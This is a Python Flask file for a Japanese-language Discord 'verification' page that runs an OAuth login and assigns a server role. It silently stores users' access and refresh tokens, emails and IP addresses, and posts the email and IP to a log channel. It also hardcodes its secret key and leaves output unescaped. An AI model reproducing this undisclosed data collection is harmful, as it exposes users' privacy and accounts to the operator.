import sqlite3
import requests
import os
from flask import Flask, request, jsonify

app = Flask(__name__)
app.secret_key = 'terufnisnotop'

CLIENT_ID = os.environ.get('CLIENT_ID')
CLIENT_SECRET = os.environ.get('CLIENT_SECRET')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
REDIRECT_URI = os.environ.get('REDIRECT_URI')
GUILD_ID = os.environ.get('GUILD_ID')

def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (user_id TEXT PRIMARY KEY, access_token TEXT, refresh_token TEXT, email TEXT, ip_address TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS settings 
                 (guild_id TEXT PRIMARY KEY, role_id TEXT, log_channel_id TEXT)''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def index():
    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join%20email"
    return f'''
        <body style="background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif;">
            <div style="text-align: center;">
                <h1>Discord Verification</h1>
                <p style="color: #888;">続行するには認証ボタンを押してください</p>
                <a href="{auth_url}"><button style="padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 10px; border: none; background-color: #5865F2; color: white;">Discordで認証する</button></a>
            </div>
        </body>
    '''

@app.route('/callback')
def callback():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    code = request.args.get('code')
    if not code:
        return "認可コードが見つかりません。", 400

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    r = requests.post('https://discord.com/api/oauth2/token', data=data)
    token_data = r.json()

    if 'access_token' not in token_data:
        return jsonify({"error": "トークン取得失敗", "response": token_data}), 400

    access_token = token_data['access_token']
    refresh_token = token_data.get('refresh_token', '')

    user_headers = {'Authorization': f'Bearer {access_token}'}
    user_info = requests.get('https://discord.com/api/users/@me', headers=user_headers).json()
    
    user_id = user_info['id']
    username = user_info['username']
    email = user_info.get('email', '不明')
    avatar = user_info.get('avatar', '')

    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, access_token, refresh_token, email, ip_address) VALUES (?, ?, ?, ?, ?)", 
              (user_id, access_token, refresh_token, email, user_ip))
    c.execute("SELECT role_id, log_channel_id FROM settings WHERE guild_id = ?", (GUILD_ID,))
    settings = c.fetchone()
    conn.commit()
    conn.close()

    if settings:
        role_id, log_channel_id = settings
        bot_headers = {"Authorization": f"Bot {BOT_TOKEN}"}

        if role_id:
            requests.put(f"https://discord.com/api/guilds/{GUILD_ID}/members/{user_id}/roles/{role_id}", headers=bot_headers)

        if log_channel_id:
            log_data = {
                "embeds": [{
                    "title": "🛡️ 詳細認証ログ",
                    "description": (
                        f"**ユーザー:** <@{user_id}>\n"
                        f"**ID:** `{user_id}`\n"
                        f"**メール:** `{email}`\n"
                        f"**IP:** `{user_ip}`"
                    ),
                    "color": 0x2f3136,
                    "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png"}
                }]
            }
            requests.post(f"https://discord.com/api/channels/{log_channel_id}/messages", headers=bot_headers, json=log_data)

    return f'''
    <!DOCTYPE html>
    <html lang="ja">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>認証完了</title>
        <style>
            body {{
                background-color: #000000;
                color: #ffffff;
                font-family: 'Helvetica Neue', Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }}
            .card {{
                background-color: #1a1a1a;
                padding: 40px;
                border-radius: 20px;
                text-align: center;
                box-shadow: 0 10px 30px rgba(0,0,0,0.5);
                border: 1px solid #333;
                max-width: 400px;
                width: 90%;
            }}
            .avatar {{
                width: 100px;
                height: 100px;
                border-radius: 50%;
                border: 3px solid #5865F2;
                margin-bottom: 20px;
            }}
            h1 {{
                font-size: 24px;
                margin-bottom: 10px;
            }}
            .status {{
                color: #43b581;
                font-weight: bold;
                font-size: 18px;
            }}
            .sub-text {{
                color: #aaa;
                font-size: 14px;
                margin-top: 15px;
            }}
        </style>
    </head>
    <body>
        <div class="card">
            <img src="https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png" class="avatar" alt="Avatar">
            <h1>{username}</h1>
            <p class="status">✅ 認証に成功しました</p>
            <p class="sub-text">このタブを閉じても大丈夫です。</p>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
